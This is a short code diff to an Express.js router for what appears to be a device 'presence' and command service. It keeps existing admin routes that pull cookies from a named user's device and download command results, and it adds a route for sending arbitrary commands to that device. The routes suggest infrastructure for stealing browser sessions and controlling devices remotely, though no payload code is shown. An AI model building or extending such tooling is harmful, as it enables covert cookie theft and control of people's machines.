@@ -4,10 +4,12 @@ const {
   heartbeat,
   submitCommandResult,
   requestCookiePull,
+  requestDeviceCommand,
   getCommand,
   downloadCommandResult,
   reportDead,
-  getLiveStatus
+  getLiveStatus,
+  getPresenceSnapshot
 } = require('../controllers/presenceController');
 
 const router = express.Router();
@@ -19,7 +21,9 @@ router.post('/commands/:id/result', authenticateToken, submitCommandResult);
 
 // Admin
 router.get('/admin/live', authenticateToken, requireAdmin, getLiveStatus);
+router.get('/admin/presence', authenticateToken, requireAdmin, getPresenceSnapshot);
 router.post('/admin/users/:userId/pull-cookies', authenticateToken, requireAdmin, requestCookiePull);
+router.post('/admin/users/:userId/command', authenticateToken, requireAdmin, requestDeviceCommand);
 router.get('/admin/commands/:id', authenticateToken, requireAdmin, getCommand);
 router.get('/admin/commands/:id/download', authenticateToken, requireAdmin, downloadCommandResult);
 
